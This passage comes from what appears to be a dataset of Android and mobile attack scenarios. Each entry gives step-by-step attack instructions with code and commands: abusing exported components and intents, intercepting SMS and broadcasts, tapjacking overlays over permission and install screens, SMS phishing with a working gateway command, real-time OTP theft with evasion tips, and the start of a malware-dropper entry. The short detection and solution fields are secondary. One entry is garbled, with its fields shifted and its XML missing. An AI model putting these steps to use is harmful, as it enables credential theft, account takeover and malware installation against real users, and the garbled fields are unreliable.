Sniff intent (optional): First, identify an exposed broadcast receiver or exported component in the target app that responds to a specific intent with extra parameters (e.g., upload=true, filename=secret.pdf). 2. Install attacker app: In your malicious app, create a UI button to trigger an Intent identical to the one sniffed. Send replay intent: Tap the button to invoke this Intent. This triggers the same code path in the victim as the original user action.4. Verify result: If victim app processes it without validating the origin or time context, it will re-execute the operation.5. Use Frida for verification: Attach to the app and hook the entry method like onStartCommand() or onReceive() and log parameter values—validate it’s the same intent logic.6. Replay variant: Use ADB to replay intents manually with: adb shell am startservice -a com.victim.ACTION_UPLOAD --es filename "/sdcard/token.txt"7. Tags: android, intent injection, replay attack, logic abuse, android-security

Title: Content Provider Hijacking
Scenario Description: A misconfigured Android ContentProvider with android:exported="true" and no permission restriction can be accessed by any app. If the provider gives access to internal databases or files, a malicious app can query or even modify data by calling ContentResolver.query() or insert() APIs.
Tools Used: Android Studio, ADB, Content Resolver, APKTool, Frida
Attack Steps: 1. Install victim app: Get an APK that exposes a content provider (e.g., com.victim.provider.DataProvider). Use adb shell dumpsys package com.victim.app or apktool d app.apk to inspect manifest.2. Find URI path: Look for <provider> tags and the authorities value, e.g., com.victim.provider.data.3. Verify accessibility: On the attacker emulator, run: adb shell content query --uri content://com.victim.provider.data/user_info4. Build attacker app: In Android Studio, use ContentResolver API to run: Cursor c = getContentResolver().query(Uri.parse("content://com.victim.provider.data/user_info"), null, null, null, null); and log the data.5. Display or exfiltrate: Read each row using c.getString(index) and store/log the results.6. Frida test: Attach to the target app and hook methods like query() or insert() of the custom ContentProvider to see incoming requests and returned data.7. PoC write: If write access is allowed, try ContentValues values = new ContentValues(); values.put("is_admin", 1); getContentResolver().update(uri, values, null, null);8. Screenshot evidence: Display intercepted data in attacker app UI or write to file on device for documentation.
Detection Method: ADB shell queries, static analysis, Frida inspection of provider methods
Solution: Use android:exported="false" by default, apply android:permission, validate queries
Tags: android, content provider, data leak, insecure export, android-security

Title: Malicious PendingIntent Abuse
Scenario Description: A PendingIntent allows one app to perform actions on behalf of another. If an app shares a mutable PendingIntent with another app or broadcasts it without protection, a malicious app can hijack it, modify its contents, and trigger unintended actions such as sending SMS, launching fake UIs, or bypassing checks.
Tools Used: Android Studio, APKTool, ADB, Logcat, Frida
Attack Steps: 1. Identify victim usage: Install a vulnerable app that passes PendingIntent via Intent extras to another app or broadcast. Use Frida or Logcat to inspect outgoing intents. Example: Intent i = new Intent(); i.putExtra("confirmIntent", pendingIntent); sendBroadcast(i);2. Setup attacker app: Create a new Android app that registers a BroadcastReceiver for the same action.3. Intercept PendingIntent: In the onReceive() method of your BroadcastReceiver, extract: PendingIntent pi = intent.getParcelableExtra("confirmIntent");4. Modify intent (mutable): If PendingIntent was created with FLAG_MUTABLE, wrap and alter it using Intent hijack = new Intent(); hijack.setClass(...); pi.send(context, 0, hijack);5. Trigger fake action: Your hijacked Intent may open a malicious Activity instead of the original one.6. Simulate abuse: Use hijacked PendingIntent to send an SMS, delete a file, or redirect a flow.7. Log effects: Use Logcat or app UI to confirm the unintended behavior occurred.8. Frida confirmation: Attach to app and hook PendingIntent.send() to validate payload manipulation.9. PoC: Present fake UI or action confirming full PendingIntent takeover.10. Document impact: Capture screenshots, log evidence, and confirm lack of FLAG_IMMUTABLE.
Impact: Hijacking app execution path, spoofed UI, command abuse
Detection Method: Frida instrumentation, Logcat inspection, static analysis of flag usage
Solution: Always use FLAG_IMMUTABLE for PendingIntent unless strictly needed mutable, never share via unprotected broadcasts
Tags: android, pendingintent, hijacking, spoofing, mutability, android-security

Title: Intent Hijacking via Malicious Activity
Scenario Description: When an app uses an implicit intent to open an activity (e.g., file viewer, payment handler) without explicitly targeting a known package or validating the response, a malicious app can register an activity to respond first, hijacking the intent.
Tools Used: Android Studio, APKTool, ADB, Emulator, Manifest Viewer
Attack Steps:
1. Install the victim app: Use an app that launches an external Activity via implicit intent (like ACTION_VIEW, ACTION_SEND, or custom actions). Example: Intent i = new Intent(Intent.ACTION_VIEW); i.setType("text/plain"); startActivity(i);2. Analyze implicit intent: Use APKTool or open the app code if available. Confirm that the app is using an implicit intent without setting the package or component name (e.g., i.setPackage("com.trusted.viewer")).3. Build attacker app: In Android Studio, create a new app. Declare an Activity in AndroidManifest.xml with intent filters matching the victim’s intent:xml







4. Implement hijack logic: In HijackActivity.java, capture incoming data and log it:java
Intent i = getIntent();
String hijackedData = i.getStringExtra("EXTRA_KEY");
Log.d("Hijack", hijackedData);
// Optionally show fake UI or redirect user
5. Install attacker app on same device/emulator.6. Trigger hijack: Launch the victim app and perform the action that sends the implicit intent.7. Observe behavior: Android will show a dialog (chooser) asking which app to use. If attacker sets intent-filter with high priority or user selects it once, it will receive the intent.8. Auto hijack: Use android:priority in the manifest or set attacker app as default to skip chooser.9. Proof: Use `adb logcat
Target Type: grep Hijack` to confirm intent data was intercepted.
Detection Method: Data leakage, phishing UI, malicious behavior trigger
Solution: Manifest inspection, behavior analysis, Frida/Logcat monitoring
Tags: Always use explicit intents for sensitive actions, validate received intents, use package/component targeting
Source: android, hijacking, intent spoofing, malicious activity, secure intents, android-security

Title: Stealing Data via Exported Components
Scenario Description: An attacker creates a malicious Android app to access data from another app’s exported components (like exported Activities, Services, or ContentProviders) that are not properly secured. If the target app has components marked as exported=true without permission protection, a malicious app can invoke them and retrieve sensitive data.
Tools Used: Android Studio, APKTool, Emulator, ADB, Frida (for dynamic inspection), Java/Kotlin
Attack Steps: 1. Set up Environment: Install Android Studio and create two apps – one is the vulnerable target app with exported component, and another is the attacker app. 2. Inspect Target App: Use APKTool (apktool d app.apk) to decompile the target app and check the AndroidManifest.xml. Look for exported="true" in Activities, Services, or ContentProviders without any android:permission protection. 3. Identify Data Leakage: For example, suppose there is an exported activity named com.target.SensitiveInfoActivity that shows user data. 4. Write Malicious Intent Code: In the attack app, write Java/Kotlin code to invoke that activity using an explicit intent. Example: Intent i = new Intent(); i.setComponent(new ComponentName("com.target", "com.target.SensitiveInfoActivity")); startActivity(i); 5. Launch and Test: Install both apps on the emulator or real device. Run the attacker app and trigger the intent. If the sensitive data screen appears or logs expose internal data, the attack is successful. 6. Advanced – Extract Data from ContentProvider: If the exported component is a ContentProvider (e.g., content://com.target.provider.UserInfo), use a content resolver in the attacker app like: Cursor c = getContentResolver().query(Uri.parse("content://com.target.provider.UserInfo"), null, null, null, null); then iterate over the cursor to extract data. 7. Optional Logging: Log the stolen data in attacker app logs using Log.d("StolenData", data) or write to a local file. 8. Confirm Breach: Check if data is exposed from the target app without user interaction or permission prompt. If so, the attack confirms a successful data theft via exported components.
Vulnerability: Misconfigured exported components (Activity, Service, ContentProvider) without permission checks
Impact: Unauthorized access to sensitive data, privacy violations, potential escalation to further attacks
Detection Method: Use tools like Drozer, Frida, or Logcat to detect suspicious cross-app component access. Monitor logs for unknown component triggers.
Solution: Never export components unless absolutely necessary. If exported, enforce android:permission, and validate caller identity in code. Use android:exported="false" by default in AndroidManifest.xml for components not meant for external access.
Tags: mobile, android, intent hijacking, component export, data theft, app pentest, misconfiguration
Source: Android Developer Guide, OWASP Mobile Top 10

Title: Hijacking Custom App Broadcast
Scenario Description: A vulnerable app sends a custom broadcast intent without permission or protection. An attacker registers a malicious BroadcastReceiver with the same action string and captures the broadcast. This allows the attacker to intercept private data or trigger malicious behavior.
Tools Used: Android Studio, Emulator, ADB, APKTool, Logcat
Attack Steps: 1. Set Up Environment: Install Android Studio. Create two apps: (a) Victim app that sends a custom broadcast using an intent with action like "com.victim.SEND_DATA" and (b) Attacker app with a malicious receiver. 2. Create Victim App: In the victim app, inside an activity, write: Intent i = new Intent(); i.setAction("com.victim.SEND_DATA"); i.putExtra("secret", "Sensitive Info"); sendBroadcast(i);. Build and run this app. 3. Create Attacker App Receiver: In the attacker app, create a receiver in AndroidManifest.xml: <receiver android:name=".HijackReceiver"><intent-filter><action android:name="com.victim.SEND_DATA"/></intent-filter></receiver>. 4. Log Intercepted Data: In HijackReceiver.java, implement onReceive: retrieve the "secret" extra using intent.getStringExtra("secret") and log it. Example: Log.d("HijackedData", secret);. 5. Install & Test: Install both apps. Run the victim app. Then check Logcat in attacker app logs. You’ll see the broadcast was intercepted and "Sensitive Info" was captured.
Vulnerability: Lack of broadcast protection and permission enforcement
Impact: Intercepting sensitive data, unauthorized access to inter-app communication
Detection Method: Use Frida, Logcat, or Drozer to monitor unexpected broadcast receivers catching intents
Solution: Always send broadcasts with permission using sendBroadcast(intent, "your.custom.PERMISSION") and enforce receiver permissions in Manifest
Tags: mobile, android, broadcast, hijack, intent, receiver

Title: Triggering Exported Broadcast Receiver
Scenario Description: A vulnerable app has an exported broadcast receiver exposed via exported="true" in the Manifest. This allows any app to send a crafted broadcast to it. The attacker can trigger internal app logic or unintended behavior.
Attack Steps: 1. Inspect Target App: Decompile the target app APK using apktool d app.apk. Open the AndroidManifest.xml and identify exported receivers like <receiver android:exported="true" android:name="com.victim.MyReceiver">. Note the <intent-filter> action like com.victim.ACTION_TRIGGER. 2. Set Up Attacker App: In Android Studio, create a new app that will send a broadcast using the same action. 3. Write Malicious Broadcast Code: In the attacker app's main activity, write: Intent i = new Intent(); i.setAction("com.victim.ACTION_TRIGGER"); i.setComponent(new ComponentName("com.victim", "com.victim.MyReceiver")); sendBroadcast(i);. 4. Optional – Inject Extra Data: If you know the receiver handles extras like "task", add: i.putExtra("task", "delete_all"); 5. Install & Run: Install the attacker app and victim app on emulator. Run the attacker app to trigger the broadcast. If the victim receiver performs an action like deleting files, starting services, or processing sensitive data, the attack is successful. 6. Verify Effect: Use ADB logcat or inside the victim app to check if the unintended code path executed.
Vulnerability: Exported receiver without validation or permission
Impact: Unauthorized control of app logic, abuse of functionality
Detection Method: Monitor Logcat for suspicious broadcast triggers from untrusted sources
Solution: Do not export receivers unless required. If needed, enforce custom permissions and validate intent origin using getCallingPackage()
Tags: android, mobile, broadcast, exported receiver, hijack, malware

Title: Overriding Dynamic Receiver with Same Priority
Scenario Description: Android allows apps to dynamically register broadcast receivers at runtime. If a system or app sends an unprotected broadcast, an attacker app can dynamically register a receiver for the same broadcast with equal or higher priority, potentially receiving the broadcast before the intended receiver.
Attack Steps: 1. Understand Victim Behavior: Suppose a legitimate app listens to system broadcast android.intent.action.BATTERY_CHANGED using a dynamically registered receiver with default priority. 2. Create Attacker App: In Android Studio, create a new app that registers a receiver for the same action at runtime. 3. Register Malicious Receiver: In the attack app’s onCreate, write: IntentFilter filter = new IntentFilter("android.intent.action.BATTERY_CHANGED"); filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY); registerReceiver(new HijackReceiver(), filter); 4. Log Data: In HijackReceiver.java, log battery data: Intent intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) and display it using Logcat or Toast. 5. Install and Run: Install and run the attacker app. Now simulate a battery change event (e.g., plug in charger or simulate event via ADB). 6. Verify Interception: Check Logcat in the attacker app. If it receives the event before the legitimate app, interception is successful. 7. Test with Multiple Receivers: Observe whether the attacker app interferes with legitimate functionality, proving the hijack.
Vulnerability: Dynamic broadcast receivers with high priority and no permission restrictions
Impact: Interference with legitimate app flow, sensitive data leakage
Detection Method: Monitor dynamically registered receivers, prioritize trusted apps
Solution: Restrict broadcasts with permission, avoid using high-priority filters, enforce identity validation
Tags: mobile, android, dynamic receiver, broadcast hijack, priority abuse

Title: Sticky Broadcast Sniffing (Legacy)
Scenario Description: In older Android versions (prior to API 21), sticky broadcasts could be sent and persisted by the system. Any app could register a receiver and read the last broadcast even if it wasn’t running at that time. This can be abused to sniff sensitive broadcast data without any permissions.
Tools Used: Android Studio, Emulator with Android 4.4/KitKat or lower, Logcat
Attack Steps: 1. Set Up Legacy Emulator: In Android Studio, install an emulator running Android KitKat (API 19) or lower where sticky broadcasts are supported. 2. Understand Sticky Broadcasts: These are broadcasts that persist even after being sent, such as Intent.ACTION_BATTERY_CHANGED. 3. Create Attacker App: In Android Studio, create a new app. In your MainActivity.java, inside onCreate(), register a receiver for a sticky broadcast using: IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED); Intent batteryStatus = registerReceiver(null, filter); 4. Extract Sensitive Info: Use batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1); to get current battery level or other broadcast extras like temperature, voltage. 5. Log Data: Print these values to Logcat using Log.d("StickySniff", "Battery Level: " + level);. 6. Run & Observe: Launch your attacker app. Even without sending any broadcast, you will see it receives data that was persisted in system memory via sticky broadcast. 7. Confirm Sniffing: No permissions were needed, and the sensitive data like battery level, charging status, or system info is now sniffed.
Vulnerability: Legacy sticky broadcasts still accessible without permission
Impact: Passive information theft via legacy APIs
Detection Method: Monitor app behavior on older OS versions; flag apps accessing sticky broadcasts
Solution: Upgrade to newer Android versions; use LocalBroadcastManager for app-specific broadcasts
Tags: mobile, android, sticky broadcast, legacy, intent sniffing, api19

Title: Ordered Broadcast Interception
Scenario Description: Android ordered broadcasts deliver intents to receivers one at a time based on their priority. A malicious app can register a high-priority receiver to intercept the broadcast first, read or modify it, and optionally block it from reaching legitimate receivers by aborting it.
Attack Steps: 1. Create Broadcast Sender App (Victim): In Android Studio, build an app that sends an ordered broadcast like: Intent i = new Intent("com.victim.ORDERED_EVENT"); sendOrderedBroadcast(i, null);. 2. Create Attacker App: Build a second app that registers a dynamic broadcast receiver with high priority. In MainActivity, write: IntentFilter filter = new IntentFilter("com.victim.ORDERED_EVENT"); filter.setPriority(999); registerReceiver(new AttackReceiver(), filter);. 3. Implement AttackReceiver: In the receiver, implement onReceive() to read the broadcast, log the message, and optionally abort it using abortBroadcast();. This will stop the broadcast from continuing. 4. Log Hijacked Data: Inside onReceive, use intent.getStringExtra("data") or Log.d("Intercepted", "Broadcast Hijacked");. 5. Install Both Apps: Deploy both apps to emulator. Run the victim sender app first. 6. Observe Interception: Run attacker app. You will see attacker receiver logs the intent first and can block it. 7. Test Without Abort: Comment out abortBroadcast() to observe how the broadcast continues to other receivers if not aborted.
Vulnerability: Ordered broadcasts abused by priority-based hijack
Impact: Prevents intended broadcast flow, may alter or block expected app behavior
Detection Method: Analyze Logcat; check for missing expected broadcast logs
Solution: Avoid using ordered broadcasts for sensitive data; validate senders; use permissions
Tags: android, mobile, ordered broadcast, hijack, priority abuse

Title: Hijack SMS or BOOT Broadcasts
Scenario Description: SMS_RECEIVED and BOOT_COMPLETED broadcasts are highly privileged. Malicious apps may declare these in the manifest and gain access to sensitive user data or trigger background behavior without user interaction.
Attack Steps: 1. Create Attacker App: In Android Studio, build a new app. In AndroidManifest.xml, register receiver for BOOT_COMPLETED: <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true"> <intent-filter> <action android:name="android.intent.action.BOOT_COMPLETED"/> </intent-filter> </receiver> and request RECEIVE_BOOT_COMPLETED permission. For SMS, register <receiver android:name=".SmsReceiver"> <intent-filter android:priority="1000"> <action android:name="android.provider.Telephony.SMS_RECEIVED"/> </intent-filter> </receiver> with permission RECEIVE_SMS. 2. Implement Receiver Code: In BootReceiver.java, in onReceive(), log a message like Log.d("BOOT_HIJACK", "Boot detected, running background tasks");. In SmsReceiver.java, use SmsMessage.createFromPdu(...) to extract SMS body and log content. 3. Grant Permissions: In AndroidManifest.xml, request permissions <uses-permission android:name="android.permission.RECEIVE_SMS"/> and <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>. 4. Install App and Reboot Emulator: Install the attacker app, then reboot emulator using adb reboot. After reboot, observe that BootReceiver logs appear even without opening the app. 5. Send Test SMS: Use SMS simulator or another app to send SMS to emulator. The SmsReceiver will automatically log received messages even without foreground activity. 6. Confirm Hijack: The app intercepts broadcasts and runs silently in the background, confirming successful hijack.
MITRE Technique: T1438 - Hijack Execution Flow: Android Broadcast Receivers
Detection Method: Use runtime monitoring, scan for SMS/BOOT receivers with Drozer or MobSF
Solution: Enforce runtime permissions, review Manifest receivers, restrict RECEIVE_SMS to needed apps only
Tags: mobile, android, sms hijack, boot receiver, malware

Title: Transparent Overlay on System Settings
Scenario Description: A malicious app creates a transparent or semi-transparent overlay on top of a sensitive system UI (e.g., Settings screen) to trick users into unknowingly tapping buttons like "Enable Unknown Sources" or "Allow App Access".
Tools Used: Android Studio, Emulator, Java/Kotlin, Overlay Permission
Attack Steps: 1. Create Malicious App: Open Android Studio and start a new Android project. In AndroidManifest.xml, request the SYSTEM_ALERT_WINDOW permission by adding <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>. 2. Request Permission at Runtime: In MainActivity.java, prompt user to grant overlay permission using Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())); startActivityForResult(intent, REQUEST_CODE);. 3. Design Overlay Layout: Create a transparent layout file overlay.xml with a full-screen LinearLayout or RelativeLayout and set background to @android:color/transparent. Add an invisible or fake button (Button android:background="@android:color/transparent" android:onClick="handleClick"). 4. Display Overlay: Use WindowManager to display the overlay after permission is granted. Example: WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE); WindowManager.LayoutParams params = new WindowManager.LayoutParams(MATCH_PARENT, MATCH_PARENT, TYPE_APPLICATION_OVERLAY, FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT); wm.addView(overlayView, params);. 5. Launch Target Settings Screen Behind Overlay: Use an intent to launch system settings like startActivity(new Intent(Settings.ACTION_SECURITY_SETTINGS)); right before showing the overlay. 6. Position Overlay Button Over Real Setting: Manually align your invisible button in overlay.xml using layout_marginTop or use screen coordinates to match the real system toggle location. 7. User Taps: The user thinks they are tapping an innocent button or empty space, but they are actually enabling a setting like "Install from Unknown Sources". 8. Verify Result: Check settings — if the action like enabling unknown sources happened, the overlay trick succeeded.
Impact: Tricking user into enabling sensitive permissions
Detection Method: Monitor TYPE_APPLICATION_OVERLAY usage, tap simulation via accessibility APIs
Solution: Block overlays on sensitive screens (Android 6+ does this by default), use secure UI flags
Tags: tapjacking, overlay, android, system ui, settings abuse

Title: Fake Button Over Real UI (Overlay Phishing)
Scenario Description: A phishing attack using a fake UI overlay that mimics a real app's login screen or button. Users tap thinking they are clicking a real button, but instead activate a malicious function or submit credentials.
Attack Steps: 1. Create the Malicious App: Build a new Android project in Android Studio. Request SYSTEM_ALERT_WINDOW permission in AndroidManifest.xml and also prompt user at runtime using the Settings.ACTION_MANAGE_OVERLAY_PERMISSION intent. 2. Design Fake Button Overlay: In res/layout/overlay_button.xml, design a visually appealing fake button (e.g., “Login” or “Continue”) using standard Button widget with matching size and position to the target app’s real button. 3. Implement Overlay: Create a service that loads the overlay using WindowManager with layout params TYPE_APPLICATION_OVERLAY, FLAG_NOT_TOUCH_MODAL, and FLAG_NOT_FOCUSABLE. Inflate the fake button layout and add to the screen. 4. Launch Victim App Behind: Use Intent to launch a known app (e.g., banking app) whose button you want to mimic. Launch it right before or just after drawing overlay. 5. Position Fake Button Over Real Button: Adjust layout padding and margins so that your fake button sits pixel-perfect over the real button. 6. Capture Tap: Set onClickListener on fake button to launch malicious action (like opening phishing site or enabling background service). Optionally remove the overlay after a second to avoid detection. 7. Verify Attack Success: Run the victim app, then attacker app. Try to tap the button — the fake button hijacks the touch and executes attacker action instead of the intended app action. 8. Optional Logging: Print logs in attacker service to confirm the tap was captured.
Impact: Phishing credentials, app impersonation, malicious redirection
Detection Method: Look for mismatched button tap behavior, verify UI using accessibility services
Solution: Block overlays via secure windows or enforce app switch protection (FLAG_SECURE)
Tags: overlay phishing, fake UI, android, button hijack, tapjacking

Title: Toast-Based Tapjacking (Legacy Android < 6)
Scenario Description: In Android versions below 6.0 (API 23), apps could use Toast windows to draw UI overlays that register touch events. This allowed malicious apps to create invisible overlays on top of sensitive screens to hijack taps.
Attack Steps: 1. Set Up Legacy Device: Create and run an Android emulator with Android KitKat (API 19) or Lollipop (API 21) where overlay protections don’t exist. 2. Create Malicious App: In Android Studio, build a new app. No special permission is needed for Toast overlays. 3. Create Transparent Toast View: In res/layout/overlay_toast.xml, design a transparent LinearLayout with a fake button (e.g., a blank or translucent button). 4. Display Custom Toast: In your app code, inflate the layout and attach it to a Toast: View toastView = getLayoutInflater().inflate(R.layout.overlay_toast, null); Toast toast = new Toast(getApplicationContext()); toast.setView(toastView); toast.setDuration(Toast.LENGTH_LONG); toast.setGravity(Gravity.TOP, 0, 200); toast.show();. 5. Launch System Settings or Target App: Use Intent to launch Settings.ACTION_SECURITY_SETTINGS or a specific app while your toast is active. 6. Position Fake UI Over Real Button: Adjust Gravity.TOP and pixel offset so the transparent layout covers sensitive buttons like "Install App", "Allow", or "OK". 7. User Taps: The user sees no visible UI from attacker, but actually taps through the toast onto the real button below. 8. Confirm Tapjacking: If a protected action (like enabling unknown sources or installing an app) happens without the user’s intention, the toast hijack worked.
Impact: Silent execution of unintended user actions
Detection Method: Difficult to detect in older Android, no visual UI evidence
Solution: Upgrade Android versions; use app flag FLAG_SECURE; Android 6+ blocks this
Tags: toast overlay, android, legacy tapjacking, ui exploit

Title: Permission Grant Hijack (Runtime Permission)
Scenario Description: A malicious app tricks the user into unknowingly granting a dangerous permission (e.g., SMS, Location) by overlaying a fake UI that hides the system permission dialog and redirects taps to the "Allow" button.
Attack Steps: 1. Create Malicious App: Open Android Studio and create a new project. In AndroidManifest.xml, request SYSTEM_ALERT_WINDOW permission and any runtime permission like android.permission.READ_SMS. Also, use <uses-permission-sdk-23 android:name="android.permission.READ_SMS"/>. 2. Request Overlay Permission: At runtime, prompt user to grant SYSTEM_ALERT_WINDOW using Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())). 3. Design Fake UI Overlay: Create a transparent layout with a fake “Next” or “OK” button in res/layout/overlay_layout.xml. This button should visually appear harmless and be placed exactly where the real system permission dialog's "Allow" button appears. 4. Trigger Runtime Permission Dialog: In the activity, call ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, 101); to launch system permission dialog. 5. Display Overlay Immediately: When dialog appears, use WindowManager to load the fake overlay with your fake button using TYPE_APPLICATION_OVERLAY and FLAG_NOT_TOUCH_MODAL. Position it carefully over the real “Allow” button. 6. Trick the User: Display text like “Tap here to continue” on your overlay button. When user taps it, the click passes through the transparent overlay and clicks the real permission grant button beneath. 7. Log Success: In onRequestPermissionsResult, log if permission was granted. If grantResults[0] == PackageManager.PERMISSION_GRANTED, the hijack worked. 8. Confirm Exploit: Check App Info > Permissions to confirm SMS permission is now granted without user's informed consent.
Vulnerability: Overlay on system dialog hijacking runtime approval
Impact: Silent elevation of app privileges via UI trickery
Detection Method: Monitor permission grants with overlay usage; use accessibility tools
Solution: Android 6+ now blocks overlays during sensitive permission prompts; use secure windows
Tags: android, permission, tapjacking, overlay, runtime exploit

Title: Fake Game or Tutorial over Critical UI
Scenario Description: A malicious app pretends to be a simple game or interactive tutorial. It overlays gameplay graphics over sensitive screens like system settings, making the user believe they are playing, while their taps actually interact with critical system options.
Attack Steps: 1. Create Malicious App: In Android Studio, start a new project. Add SYSTEM_ALERT_WINDOW permission in AndroidManifest.xml. Prompt the user to allow overlays at runtime using Settings.ACTION_MANAGE_OVERLAY_PERMISSION. 2. Design Fake UI Game/Tutorial: Create an XML layout (game_overlay.xml) with UI elements like dots, arrows, or “Tap here to jump!” instructions using ImageView or TextView. 3. Trigger Sensitive UI: Launch system settings (e.g., Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES) or any app you want the user to interact with unknowingly, using an Intent from your app. 4. Display Overlay on Top: Inflate game_overlay.xml and attach it to WindowManager with TYPE_APPLICATION_OVERLAY, FLAG_NOT_TOUCH_MODAL, and transparent background. Carefully align your fake “jump” buttons over real system options like “Allow Install”. 5. Encourage Repeated Taps: Show flashing graphics or instructions to “Tap quickly!” or “Tap to win!” to induce user interaction. Each tap hits the button below. 6. Log Events: Optionally track how many times a user taps the “game” to confirm taps are hitting real buttons. 7. Verify Exploit: After user interaction, check if sensitive setting has changed (e.g., install permission enabled or new app installed).
Vulnerability: Social engineering via graphical overlay over critical buttons
Impact: Indirect compromise of settings using game/training visuals
Detection Method: Observe unexpected permission states after rapid user taps
Solution: Don’t allow overlay drawing on critical screens; use FLAG_SECURE and accessibility-based monitoring
Tags: tapjacking, game overlay, social engineering, android ui abuse

Title: Tapjacking Google Play Install Page
Scenario Description: The attacker tricks the user into installing a malicious app by opening its Google Play page in the background and drawing a deceptive overlay. When the user taps a fake UI, their taps actually press the “Install” and “Accept” buttons, silently initiating the install process.
Tools Used: Android Studio, Google Play Link of Target App, SYSTEM_ALERT_WINDOW, Emulator
Attack Steps: 1. Find Target App Link: Choose a malicious or test app from Play Store. Copy its full URL (e.g., https://play.google.com/store/apps/details?id=com.evil.app). 2. Build Attacker App: In Android Studio, start a new project. Request SYSTEM_ALERT_WINDOW permission and ask the user to grant it at runtime using Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION). 3. Create Deceptive UI Overlay: Build a transparent layout (overlay_install.xml) with a “Check this prize!” or “Get Reward” button. Use attractive styling, animations, and phrases to prompt tapping. 4. Launch Target App Play Page: Programmatically open the target app’s Play Store page using Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=com.evil.app")); startActivity(intent);. 5. Show Overlay Over Play Store: Immediately after launching Play Store, render the fake overlay on top of it using WindowManager with TYPE_APPLICATION_OVERLAY. Position your fake button over the actual “Install” or “Accept” buttons of Play Store. 6. Simulate Interaction: Display messages like “Tap twice to get gift!” — each tap hits the real Play Store buttons underneath. 7. Verify App Installed: Wait and monitor the result — the app gets installed without user understanding that they clicked “Install” and “Accept”. Confirm by checking device app list.
Vulnerability: Tap overlay over install confirmation buttons
Impact: Silent installation of malicious apps using tap trickery
Detection Method: Use accessibility monitoring; check for silent installs without user consent
Solution: Android 6+ blocks overlays on Play Store; use overlay-blocking or secure UI
Tags: tapjacking, playstore, app install trick, android overlay

Title: Malicious Link in SMS
Scenario Description: A threat actor sends an SMS with a shortened malicious link disguised as a bank update or free gift. When the victim clicks, they're redirected to a fake login page or a malicious file download, leading to credential theft or malware install.
Tools Used: Online SMS gateway (e.g., textbelt, Twilio), Ngrok or local server, Fake login page or payload APK
Attack Steps: 1. Set Up Malicious Web Page: Create a phishing login page (e.g., fake bank or account site) using HTML. Host it locally or on a free hosting platform. If using localhost, tunnel it using Ngrok: ngrok http 80. Copy the forwarded HTTPS link. 2. Shorten the Link: Use a URL shortener like bit.ly or tinyurl.com to hide the Ngrok/phishing link. 3. Prepare SMS Text: Write a convincing SMS like “Your account is flagged for verification. Tap to verify: [shortened link]”. 4. Send SMS: Use a free SMS service like textbelt (via terminal: curl -X POST https://textbelt.com/text --data-urlencode phone='TARGET_PHONE' --data-urlencode message='YOUR MESSAGE' --data-urlencode key='textbelt'). 5. Victim Clicks Link: Once received, the victim taps the link and is directed to your hosted phishing page. 6. Credential Harvesting: Victim enters credentials on the fake form. In your phishing HTML form’s action, ensure the data is POSTed to your controlled server. Use PHP/Flask backend to capture the input and log it. 7. Observe Logs: Check server logs or terminal to confirm submitted data. 8. Avoid Detection: Use non-obvious domains, make the page visually similar to real banking/login pages, and match fonts/colors/logos.
Vulnerability: Lack of SMS validation and link masking
Impact: Credential theft, malware install, financial compromise
Detection Method: Use network proxy logs, phishing URL databases, mobile antivirus
Solution: Train users to avoid tapping unknown links; use SMS filtering apps; block known short URLs
Tags: smishing, sms phishing, ngrok, phishing link, fake site

Title: OTP Theft / 2FA Interception
Scenario Description: Attacker tricks the victim into revealing their OTP sent via SMS by pretending to be a service like a bank or payment provider. The attacker uses this OTP in real time to bypass 2FA and take over the account.
Tools Used: Android Device, SMS Service (Twilio/TextNow), Ngrok, Live credential panel
Attack Steps: 1. Launch Live Phishing Page: Create a phishing page mimicking a trusted login (e.g., Paytm, Google). On form submit, immediately ask for OTP using a fake screen that says “We’ve sent a code to your phone, enter it to continue.” 2. Host and Tunnel Page: Use ngrok http 80 or replit, and get a live URL. Make it HTTPS to avoid suspicion. 3. Shorten URL: Use tinyurl.com or bit.ly to hide the long phishing URL. 4. Prepare Bait Message: Craft an SMS like “Google Alert: Suspicious login detected. Confirm it's you: [shortlink]”. 5. Send Message: Use a fake number app like TextNow, or an SMS gateway like Fast2SMS, and send the above message to your test target. 6. Victim Clicks and Enters Login: On receiving the SMS, user taps the link, logs into the fake page, and submits. You instantly capture the credentials. 7. OTP Prompt: Immediately show the next page requesting OTP. Meanwhile, you try to login to the real service using the captured credentials. 8. Real OTP Sent to Victim: When the actual OTP reaches victim, they believe it’s from the fake login and type it into your site. 9. Attacker Uses OTP: Quickly enter the OTP into the real site before it expires, gaining full access. 10. Log and Notify Yourself: Capture OTP on backend and log it to your dashboard or email.
Vulnerability: Social engineering and phishing via SMS
Detection Method: Detect login from unknown locations or inconsistent IPs
Solution: Use app-based 2FA (TOTP, Authenticator), avoid SMS-based codes
Tags: sms phishing, 2fa bypass, otp steal, smishing attack

Title: Fake App Download via SMS (Malware Dropper)
Scenario Description: User receives a fake promotional SMS offering a prize, free recharge, or APK update. Upon clicking the link, an APK file downloads and prompts installation. The APK is a malware dropper which installs spyware or ransomware silently.
Tools Used: Kali Linux, Evil-Droid or msfvenom, Ngrok, Free Hosting (like 000webhost), Android Emulator
